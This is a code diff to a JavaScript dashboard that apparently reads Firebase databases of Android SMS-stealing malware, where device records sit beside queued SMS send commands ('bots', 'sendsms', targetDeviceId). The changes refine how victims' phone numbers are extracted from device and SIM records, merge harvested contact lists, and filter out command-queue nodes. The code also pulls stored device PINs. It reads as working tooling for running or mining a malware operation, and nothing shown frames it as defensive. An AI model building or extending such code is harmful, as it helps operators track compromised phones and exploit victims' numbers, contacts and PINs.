@@ -508,6 +508,32 @@ function normalizePhoneDigits(v){
   if(d.length>=10)return d.slice(-10);
   return d;
 }
+function parseDevicePhone(v){
+  if(v==null||v==='')return'';
+  var s=String(v).trim();
+  if(!s)return'';
+  var parts=s.split(/[,;/|]+/);
+  for(var i=0;i<parts.length;i++){
+    var p=parts[i].trim();
+    if(looksLikePhone(p))return normalizePhoneDigits(p);
+  }
+  if(looksLikePhone(s))return normalizePhoneDigits(s);
+  return'';
+}
+function isHexDeviceKey(name){
+  return typeof name==='string'&&/^[0-9a-f]{8,32}$/i.test(name);
+}
+function isSmsCommandRecord(raw){
+  if(!raw||typeof raw!=='object')return false;
+  if(raw.targetDeviceId&&(raw.messageText||raw.msg||raw.sendSms||raw.command||raw.cmd))return true;
+  if(raw.webhookEvent&&(raw.cmd||raw.sendSms||raw.messageText||typeof raw.webhookEvent==='object'))return true;
+  if(raw.command&&raw.messageText&&(raw.phoneNumber||raw.to||raw.sendSms))return true;
+  return false;
+}
+var DEVICE_PHONE_KEYS=['phone_number','mobNo','phone','mobile','phone_no','cell','contact_no','mobile_no','sim_number','sim1','sim2','sim_1','sim_2','primary_phone','device_phone','user_phone','whatsapp','wa_number','caller_id','msisdn'];
+var PHONE_ENRICH_NODES=['user_list','user_data','devices','devices_status','Verify_Device','All_Users','All_User','online_devices','device_list','registered_users','active_devices'];
+/** rto9-style Firebase: these nodes hold SMS send commands, not device profiles */
+var COMMAND_JUNK_NODES=['clients','users','data','sendsms','bots','Admin','admin'];
 function isLikelySmsRootNode(name){
   if(!name||typeof name!=='string')return false;
   if(/^(config|settings|admin|rules|metadata|logs|test|passwords|webhook|tokens|auth|version|apk|update|banner|ads|payment|otp)$/i.test(name))return false;
@@ -1027,29 +1053,36 @@ function closeFbSheet(){document.getElementById('sheetBg').classList.remove('ope
 
 function getPhoneFromRecord(s){
   if(!s)return'';
+  if(isCommandQueueRecord(s)||isSmsCommandRecord(s))return'';
   var check=function(obj){
-    if(!obj)return null;
-    var keys=['phone_number','mobNo','phone','number','mobile','phone_no','cell','contact_no','mobile_no','sim_number','sim1','sim2','sim_1','sim_2','primary_phone','device_phone','user_phone','whatsapp','wa_number','caller_id','msisdn'];
-    for(var i=0;i<keys.length;i++){
-      if(obj[keys[i]]==null||obj[keys[i]]==='')continue;
-      var v=String(obj[keys[i]]).trim();
-      if(looksLikePhone(v))return normalizePhoneDigits(v);
+    if(!obj||isSmsCommandRecord(obj))return null;
+    var i,v,parsed;
+    for(i=0;i<DEVICE_PHONE_KEYS.length;i++){
+      if(obj[DEVICE_PHONE_KEYS[i]]==null||obj[DEVICE_PHONE_KEYS[i]]==='')continue;
+      parsed=parseDevicePhone(obj[DEVICE_PHONE_KEYS[i]]);
+      if(parsed)return parsed;
     }
     return null;
   };
+  var skipDeepKeys={action:1,sendSms:1,sms:1,webhookEvent:1,command:1,cmd:1,manual_commands:1,outbox:1,sendsms:1};
   var deepScanPhone=function(obj,depth){
-    if(!obj||typeof obj!=='object'||depth>6)return'';
-    var phoneKey=/phone|mobile|mob|number|sim|cell|contact|whatsapp|wa_no|caller|msisdn/i;
-    var k,v,p,s;
+    if(!obj||typeof obj!=='object'||depth>6||isSmsCommandRecord(obj))return'';
+    var k,v,p,parsed,i;
     for(k in obj){
       if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
+      if(skipDeepKeys[k])continue;
       v=obj[k];
       if(v==null)continue;
-      if(phoneKey.test(k)&&typeof v!=='object'){
-        if(looksLikePhone(v))return normalizePhoneDigits(v);
+      if(typeof v!=='object'){
+        for(i=0;i<DEVICE_PHONE_KEYS.length;i++){
+          if(k===DEVICE_PHONE_KEYS[i]||(k==='number'&&depth>0)){
+            parsed=parseDevicePhone(v);
+            if(parsed)return parsed;
+          }
+        }
+        continue;
       }
-      if(typeof v==='string'&&looksLikePhone(v)&&phoneKey.test(k))return normalizePhoneDigits(v);
-      if(v&&typeof v==='object'){
+      if(v&&typeof v==='object'&&!skipDeepKeys[k]){
         p=deepScanPhone(v,depth+1);
         if(p)return p;
       }
@@ -1057,14 +1090,14 @@ function getPhoneFromRecord(s){
     return'';
   };
   var p=check(s);if(p)return p;
-  var nests=['device_info','live_data','deviceInfo','liveData','data','info','profile','user','device','sim_info','simInfo','sim_data','SimInfo'];
+  var nests=['device_info','live_data','deviceInfo','liveData','info','profile','sim_info','simInfo','sim_data','SimInfo'];
   for(var n=0;n<nests.length;n++){if(s[nests[n]]){p=check(s[nests[n]]);if(p)return p;}}
   if(s.Device_info&&typeof s.Device_info==='string'){
     var m=s.Device_info.match(/(?:phone|mobile|number|sim)[^\n:]*[:]\s*([+\d\s-]{8,15})/i);
     if(m&&m[1]&&looksLikePhone(m[1]))return normalizePhoneDigits(m[1]);
   }
-  if(s.sims&&Array.isArray(s.sims)){for(var i=0;i<s.sims.length;i++){var sim=s.sims[i];var pn=sim.phoneNumber||sim.number||sim.phone||sim.mobNo||sim.mobile||sim.contact_no;if(pn&&looksLikePhone(pn))return normalizePhoneDigits(pn);}}
-  if(s.sim_info&&typeof s.sim_info==='object'){var si=s.sim_info;p=check(si);if(p)return p;if(si.sims&&Array.isArray(si.sims)){for(var j=0;j<si.sims.length;j++){var sim2=si.sims[j];var pn2=sim2.phoneNumber||sim2.number||sim2.phone||sim2.mobNo||sim2.mobile||sim2.contact_no;if(pn2&&looksLikePhone(pn2))return normalizePhoneDigits(pn2);}}}
+  if(s.sims&&Array.isArray(s.sims)){for(var i=0;i<s.sims.length;i++){var sim=s.sims[i];if(!sim||typeof sim!=='object')continue;var pn=sim.phone_number||sim.phone||sim.mobNo||sim.mobile||sim.contact_no||sim.number;if(pn&&looksLikePhone(pn))return normalizePhoneDigits(pn);}}
+  if(s.sim_info&&typeof s.sim_info==='object'){var si=s.sim_info;p=check(si);if(p)return p;if(si.sims&&Array.isArray(si.sims)){for(var j=0;j<si.sims.length;j++){var sim2=si.sims[j];var pn2=sim2.phone_number||sim2.phone||sim2.mobNo||sim2.mobile||sim2.contact_no||sim2.number;if(pn2&&looksLikePhone(pn2))return normalizePhoneDigits(pn2);}}}
   return deepScanPhone(s,0);
 }
 function extractContactsFromRecord(raw){
@@ -1120,7 +1153,8 @@ function mergeContacts(existing,found){
 function isCommandQueueRecord(raw){
   if(!raw||typeof raw!=='object')return false;
   if(raw.phone_number||raw.d_name||raw.Device_info||raw.modelName||raw.deviceId)return false;
-  if(raw.battery!==undefined&&raw.battery!==null&&!raw.cmd&&!raw.webhookEvent)return false;
+  if(raw.battery!==undefined&&raw.battery!==null&&!raw.cmd&&!raw.webhookEvent&&!raw.targetDeviceId)return false;
+  if(isSmsCommandRecord(raw))return true;
   return !!(raw.cmd||raw.webhookEvent||raw.sendSms||(raw.command&&raw.messageText&&raw.phoneNumber));
 }
 function normalizeClientRecord(raw){
@@ -1147,7 +1181,7 @@ function normalizeClientRecord(raw){
       online:on2,online_status:on2,status:raw.status||'',
       battery:parseInt(raw.battery||raw.battery_level,10)||0,
       network:raw.network||raw.service_provider||'?',sms_count:raw.sms_count||0,
-      mobNo:String(raw.phone_number||'').trim()||getPhoneFromRecord(raw)
+      mobNo:parseDevicePhone(raw.phone_number)||getPhoneFromRecord(raw)
     };
   }
   if(raw.modelName||raw.deviceId||raw.mobNo||raw.device_model||raw.model||raw.Device_info)return{
@@ -1179,7 +1213,10 @@ function ingestDeviceData(fbId,node,devId,data){
   var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
   norm._node=node;norm._fbId=fbId;
   var key=makeDevKey(fbId,devId), existing=clientsRawMap[key]||{};
-  if(!norm.mobNo&&existing.mobNo)norm.mobNo=existing.mobNo;
+  if(existing._phoneSource&&(existing._phoneSource==='user_list'||existing._phoneSource==='user_data')&&existing.mobNo){
+    norm.mobNo=existing.mobNo;
+    norm._phoneSource=existing._phoneSource;
+  }else if(!norm.mobNo&&existing.mobNo)norm.mobNo=existing.mobNo;
   if((!norm.name||norm.name==='Unknown')&&existing.name&&existing.name!=='Unknown')norm.name=existing.name;
   var foundContacts=extractContactsFromRecord(data);
   if(foundContacts.length)norm.contacts=mergeContacts(existing.contacts,foundContacts);
@@ -1190,25 +1227,38 @@ function ingestDeviceData(fbId,node,devId,data){
   }
   clientsRawMap[key]=Object.assign({},existing,norm);
 }
+function getPhoneEnrichNodes(inst){
+  var nodes=PHONE_ENRICH_NODES.slice();
+  if(inst&&inst.config&&inst.config.preferredDeviceNode){
+    var pref=inst.config.preferredDeviceNode;
+    nodes=nodes.filter(function(n){return n!==pref;});
+    nodes.unshift(pref);
+  }
+  return uniqPaths(nodes);
+}
 function enrichFromAllNodes(inst){
-  var roots=uniqPaths((inst.rootKeys||[]).concat(getDeviceNodesForInst(inst))), keys=Object.keys(clientsRawMap), tasks=[], batch=0, maxBatch=36;
+  var roots=getPhoneEnrichNodes(inst), keys=Object.keys(clientsRawMap), tasks=[], batch=0, maxBatch=24;
   keys.forEach(function(mapKey){
     var p=parseDevKey(mapKey);
     if(p.fbId!==inst.id)return;
     var rec=clientsRawMap[mapKey];
+    if(rec._phoneSource==='user_list'||rec._phoneSource==='user_data')return;
     var needsPhone=!rec.mobNo||!String(rec.mobNo).trim();
     var needsContacts=!rec.contacts||!rec.contacts.length;
     if(!needsPhone&&!needsContacts)return;
     roots.forEach(function(node){
-      if(!node||SKIP_NODES.indexOf(node)>=0)return;
-      if(isLikelySmsRootNode(node))return;
+      if(!node||node==='clients'||node==='users'||node==='data'||isHexDeviceKey(node))return;
       if(batch>=maxBatch)return;
       batch++;
       tasks.push(
         restJsonInst(inst,node+'/'+p.devId).then(function(data){
           if(!data||typeof data!=='object'||isFirebaseErr(data))return;
+          if(isCommandQueueRecord(data)||isSmsCommandRecord(data))return;
           var phone=getPhoneFromRecord(data);
-          if(phone&&(!rec.mobNo||!String(rec.mobNo).trim()))rec.mobNo=phone;
+          if(phone&&(!rec.mobNo||!String(rec.mobNo).trim())){
+            rec.mobNo=phone;
+            rec._phoneSource=node;
+          }
           var contacts=extractContactsFromRecord(data);
           if(contacts.length)rec.contacts=mergeContacts(rec.contacts,contacts);
           if(phone||contacts.length)clientsRawMap[mapKey]=rec;
@@ -1243,7 +1293,7 @@ function processClientsDataNow(){
     var on=resolveOnlineStatus(s,p.fbId);
     var contacts=s.contacts||extractContactsFromRecord(s);
     allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'user_list',
-      name:s.name||'Unknown',displayPhone:(s.mobNo||getPhoneFromRecord(s)||'').trim()||'No Number',brand:s.brand||'',android:s.android||'',
+      name:s.name||'Unknown',displayPhone:parseDevicePhone(s.mobNo)||getPhoneFromRecord(s)||'No Number',brand:s.brand||'',android:s.android||'',
       status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0,
       sims:extractDeviceSims(s),pin:extractPinFromRecord(s),hasPin:!!extractPinFromRecord(s),
       contacts:contacts,contactCount:contacts.length});
@@ -1287,6 +1337,9 @@ function discoverInstance(inst){
       var nodes=Object.keys(roots).filter(function(n){return isDeviceSummaryNode(n);});
       if(roots.user_list&&nodes.indexOf('user_list')<0)nodes.unshift('user_list');
       if(roots.user_data&&nodes.indexOf('user_data')<0)nodes.unshift('user_data');
+      if(roots.user_list||roots.user_data){
+        nodes=nodes.filter(function(n){return COMMAND_JUNK_NODES.indexOf(n)<0;});
+      }
       if(!nodes.length)nodes=getDeviceNodesForInst(inst);
       var tasks=[];
       nodes.forEach(function(n){
